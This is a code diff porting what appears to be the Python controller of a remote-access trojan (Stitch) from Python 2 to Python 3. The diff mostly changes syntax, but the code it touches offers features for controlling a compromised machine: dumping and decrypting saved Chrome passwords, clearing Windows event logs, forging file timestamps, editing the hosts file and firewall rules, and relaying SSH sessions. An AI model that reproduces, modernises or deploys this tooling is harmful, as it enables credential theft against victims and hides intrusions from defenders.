@@ -18,7 +18,7 @@ def st_recvall(client, count, aes_enc=None, encryption=True):
         return decrypt(buf, aes_enc)
 
 def st_receive(client,aes_enc):
-    full_response = ""
+    full_response = b""
     while True:
         lengthbuf = st_recvall(client, 4, encryption=False)
         length, = struct.unpack('!i', lengthbuf)
@@ -27,9 +27,11 @@ def st_receive(client,aes_enc):
             full_response += response
         else:
             break
-    return full_response
+    return full_response.decode('latin-1')
 
 def st_send(client, data, aes_enc):
+    if isinstance(data, str):
+        data = data.encode('latin-1')
     while data:
         cmd = encrypt(data[:1024], aes_enc)
         length = len(cmd)
@@ -64,7 +66,7 @@ class stitch_commands_library:
     def history_check(self):
         self.Config = ConfigParser.ConfigParser()
         self.Config.read(hist_ini)
-        self.cfgfile = open(hist_ini,'wb')
+        self.cfgfile = open(hist_ini,'w')
         if self.cli_target not in self.Config.sections():
             self.Config.add_section(self.cli_target)
             st_log.info('Connected to {} for the very first time'.format(self.cli_target))
@@ -117,13 +119,13 @@ class stitch_commands_library:
         response=self.receive()
         if no_error(response):
             response=self.receive()
-            print '\n{}'.format(response),
+            print('\n{}'.format(response), end='')
             while response != st_complete:
                 response=self.receive()
                 if response != st_complete:
-                    print '\b'+ response,
+                    print('\b' + response, end='')
                 else:
-                    print "\n"
+                    print()
                     break
         else:
             st_print(response)
@@ -136,7 +138,7 @@ class stitch_commands_library:
             if not no_error(response):
                 st_print(response)
             else:
-                print
+                print()
         else:
             self.pwd()
 
@@ -225,7 +227,7 @@ class stitch_commands_library:
                                 return
                             download_bar.increment()
                             if d != 'download complete':
-                                my_download.write(d)
+                                my_download.write(d.encode('latin-1'))
                             else:
                                 download_bar.complete()
                     st_print("[+] Download succesful: %s\n" % downld)
@@ -254,15 +256,15 @@ class stitch_commands_library:
         elif option == 'open':
             try:
                 while True:
-                    port = raw_input("\nEnter the desired port: ",)
-                    proto = raw_input("Enter desired type [TCP/UDP]: ",)
+                    port = input("\nEnter the desired port: ")
+                    proto = input("Enter desired type [TCP/UDP]: ")
                     if windows_client(self.cli_os):
-                        direction = raw_input("Enter desired direction [IN/OUT]: ",)
-                    correct = raw_input("\nOpen {} Port {} going {}? [Y/N]: ".format(proto,port,direction),)
+                        direction = input("Enter desired direction [IN/OUT]: ")
+                    correct = input("\nOpen {} Port {} going {}? [Y/N]: ".format(proto,port,direction))
                     if correct.lower().startswith('y'):
                         break
             except KeyboardInterrupt:
-                print '\n'
+                print()
                 return
             if windows_client(self.cli_os):
                 cmd = 'netsh advfirewall firewall add rule name="NetBios Port {} {}" dir={} action=allow protocol={} localport={}'.format(port,direction,direction,proto,port)
@@ -273,15 +275,15 @@ class stitch_commands_library:
         elif option == 'close':
             try:
                 while True:
-                    port = raw_input("\nEnter the desired port: ",)
-                    proto = raw_input("Enter desired type [TCP/UDP]: ",)
+                    port = input("\nEnter the desired port: ")
+                    proto = input("Enter desired type [TCP/UDP]: ")
                     if windows_client(self.cli_os):
-                        direction = raw_input("Enter desired direction [in/out]: ",)
-                    correct = raw_input("\nClose {} Port {} going {}? [y/n]: ".format(proto,port,direction),)
+                        direction = input("Enter desired direction [in/out]: ")
+                    correct = input("\nClose {} Port {} going {}? [y/n]: ".format(proto,port,direction))
                     if correct.lower().startswith('y'):
                         break
             except KeyboardInterrupt:
-                print '\n'
+                print()
                 return
             if windows_client(self.cli_os):
                 cmd = 'netsh advfirewall firewall delete rule name="NetBios Port {} {}" protocol={} localport={}'.format(port, direction,proto,port)
@@ -292,13 +294,13 @@ class stitch_commands_library:
         elif option == "allow" and windows_client(self.cli_os):
             try:
                 while True:
-                    prog = raw_input("\nEnter the desired program to allow: ",)
-                    rulename = raw_input("Enter the name of the firewall rule: ",)
-                    correct = raw_input('\nLet the rule "{}" allow {} through the firewall? [y/n]: '.format(rulename,prog),)
+                    prog = input("\nEnter the desired program to allow: ")
+                    rulename = input("Enter the name of the firewall rule: ")
+                    correct = input('\nLet the rule "{}" allow {} through the firewall? [y/n]: '.format(rulename,prog))
                     if correct.lower().startswith('y'):
                         break
             except KeyboardInterrupt:
-                print '\n'
+                print()
                 return
             self.pyexec('fwallow.py',pylib=True)
             self.send(prog)
@@ -343,13 +345,13 @@ class stitch_commands_library:
         if option == 'update':
             try:
                 while True:
-                    hostname = raw_input("\nEnter desired hostname to add to the hosts file: ")
-                    ipaddress = raw_input('\nEnter the IP address of "{}": '.format(hostname))
-                    correct = raw_input('\nAdd "{}" with IP: {} to the hosts file? [Y/N]: '.format(hostname,ipaddress))
+                    hostname = input("\nEnter desired hostname to add to the hosts file: ")
+                    ipaddress = input('\nEnter the IP address of "{}": '.format(hostname))
+                    correct = input('\nAdd "{}" with IP: {} to the hosts file? [Y/N]: '.format(hostname,ipaddress))
                     if correct.lower().startswith('y'):
                         break
             except KeyboardInterrupt:
-                print '\n'
+                print()
                 return
             self.pyexec('hostsupdate.py',pylib=True)
             self.send(hostname)
@@ -358,12 +360,12 @@ class stitch_commands_library:
         elif option == 'remove':
             try:
                 while True:
-                    hostname = raw_input("\nEnter desired hostname to remove from the hosts file: ")
-                    correct = raw_input('\nRemove "{}" from the hosts file? [Y/N]: '.format(hostname))
+                    hostname = input("\nEnter desired hostname to remove from the hosts file: ")
+                    correct = input('\nRemove "{}" from the hosts file? [Y/N]: '.format(hostname))
                     if correct.lower().startswith('y'):
                         break
             except KeyboardInterrupt:
-                print '\n'
+                print()
                 return
             self.pyexec('hostsremove.py',pylib=True)
             self.send(hostname)
@@ -439,12 +441,12 @@ class stitch_commands_library:
     def popup(self):
         try:
             while True:
-                message = raw_input("\nMessage to be displayed in popup: ")
-                correct = raw_input('\nDisplay a popup saying "{}" ? [Y/N]: '.format(message))
+                message = input("\nMessage to be displayed in popup: ")
+                correct = input('\nDisplay a popup saying "{}" ? [Y/N]: '.format(message))
                 if correct.lower().startswith('y'):
                     break
         except KeyboardInterrupt:
-            print '\n'
+            print()
             return
         self.pyexec('popup.py',pylib=True)
         self.send(message)
@@ -480,9 +482,8 @@ class stitch_commands_library:
                 if not py_file.endswith('.py') or os.path.isdir(py_file_path):
                     st_print("[!] Only Python scripts located in %s can use pyexec.\n" %(dir_path))
                     return
-                with open(py_file_path,'rb') as c:
-                    for line in c.readlines():
-                        code += line
+                with open(py_file_path,'r') as c:
+                    code = c.read()
                 if pylib:
                     if not f_name == 'get_path.py':
                         st_log.info('Sending {} code from {}'.format(self.cli_target, f_name))
@@ -641,12 +642,12 @@ class stitch_commands_library:
 ################################################################################
 
     def clearev(self):
-        resp = raw_input("\nAre you sure you want to clear the System, Security, and Application event logs? [Y/N]: ")
+        resp = input("\nAre you sure you want to clear the System, Security, and Application event logs? [Y/N]: ")
         if resp.lower().startswith('y'):
             self.pyexec('clearev.py',pylib=True)
             st_print(self.receive())
         else:
-            print
+            print()
 
     def chromedump(self):
         if windows_client():
@@ -677,7 +678,7 @@ class stitch_commands_library:
                             password = win32crypt.CryptUnprotectData(information[2], None, None, None, 0)[1]
                             if password:
                                 info_list += 'origin_url: {}\nusername: {}\npassword: {}\n\n'.format(information[0],information[1],str(password))
-                    except sqlite3.OperationalError, e:
+                    except sqlite3.OperationalError as e:
                             e = str(e)
                             connection.close()
                             os.remove(zip_loc)
@@ -710,12 +711,12 @@ class stitch_commands_library:
             try:
                 while True:
                     editfile = f_name
-                    edittime = raw_input("Enter desired last accessed time ['MM/DD/YYYY HH:mm:ss']: ",)
-                    correct = raw_input("\nChange last accessed time of {} to {}? [Y/N]: ".format(editfile,edittime),)
+                    edittime = input("Enter desired last accessed time ['MM/DD/YYYY HH:mm:ss']: ")
+                    correct = input("\nChange last accessed time of {} to {}? [Y/N]: ".format(editfile,edittime))
                     if correct.lower().startswith('y'):
                         break
             except KeyboardInterrupt:
-                print '\n'
+                print()
                 return
             self.pyexec('editAccessed.py',pylib=True)
             self.send(editfile)
@@ -729,12 +730,12 @@ class stitch_commands_library:
             try:
                 while True:
                     editfile = f_name
-                    edittime = raw_input("Enter desired creation time ['MM/DD/YYYY HH:mm:ss']: ",)
-                    correct = raw_input("\nChange creation time of {} to {}? [Y/N]: ".format(editfile,edittime),)
+                    edittime = input("Enter desired creation time ['MM/DD/YYYY HH:mm:ss']: ")
+                    correct = input("\nChange creation time of {} to {}? [Y/N]: ".format(editfile,edittime))
                     if correct.lower().startswith('y'):
                         break
             except KeyboardInterrupt:
-                print '\n'
+                print()
                 return
             self.pyexec('editCreation.py',pylib=True)
             self.send(editfile)
@@ -748,12 +749,12 @@ class stitch_commands_library:
             try:
                 while True:
                     editfile = f_name
-                    edittime = raw_input("Enter desired last modified time ['MM/DD/YYYY HH:mm:ss']: ",)
-                    correct = raw_input("\nChange last modified time of {} to {}? [Y/N]: ".format(editfile,edittime),)
+                    edittime = input("Enter desired last modified time ['MM/DD/YYYY HH:mm:ss']: ")
+                    correct = input("\nChange last modified time of {} to {}? [Y/N]: ".format(editfile,edittime))
                     if correct.lower().startswith('y'):
                         break
             except KeyboardInterrupt:
-                print '\n'
+                print()
                 return
             self.pyexec('editModified.py',pylib=True)
             self.send(editfile)
@@ -823,24 +824,24 @@ class stitch_commands_library:
         st_logger(resp,self.cli_dwld,'askpassword')
 
     def logintext(self):
-        text = raw_input("Enter text to be displayed on login window: ")
+        text = input("Enter text to be displayed on login window: ")
         cmd = "defaults write /Library/Preferences/com.apple.loginwindow LoginwindowText \"{}\"".format(text)
         self.send(cmd)
         st_print(self.receive())
 
     def ssh(self):
         try:
-            ssh_host = raw_input("\nPlease enter ssh hostname: ")
+            ssh_host = input("\nPlease enter ssh hostname: ")
             if 'exit' in ssh_host:
-                print '\n'
+                print()
                 return
-            ssh_user = raw_input("\nPlease enter ssh user: ")
+            ssh_user = input("\nPlease enter ssh user: ")
             if 'exit' in ssh_user:
-                print '\n'
+                print()
                 return
             ssh_pass = getpass("\nPlease enter password for {}: ".format(ssh_user))
         except KeyboardInterrupt:
-            print '\n'
+            print()
             return
 
         self.pyexec('ssh.py',pylib=True)
@@ -851,7 +852,7 @@ class stitch_commands_library:
         prompt = self.receive()
         if no_error(prompt):
             while True:
-                ssh_cmd=raw_input(prompt)
+                ssh_cmd=input(prompt)
                 if ssh_cmd == 'cls' or ssh_cmd == 'clear':
                     self.clear()
                 else:
